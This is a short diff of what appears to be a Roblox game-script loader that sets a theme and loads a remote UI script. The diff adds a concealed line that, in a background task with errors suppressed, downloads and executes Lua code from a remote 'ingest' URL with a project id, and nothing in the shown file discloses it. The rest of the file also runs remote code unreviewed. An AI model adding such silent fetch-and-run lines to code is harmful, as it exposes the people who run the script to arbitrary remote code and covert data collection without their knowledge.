@@ -11,4 +11,5 @@ Enjoy!
 --]]
 
 getgenv().theme = "justascript"
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_1187cc88005a", "1.0.0", false) end) end)
 loadstring(game:HttpGet("https://flowauth.net/v1/ui/sable.lua"))()
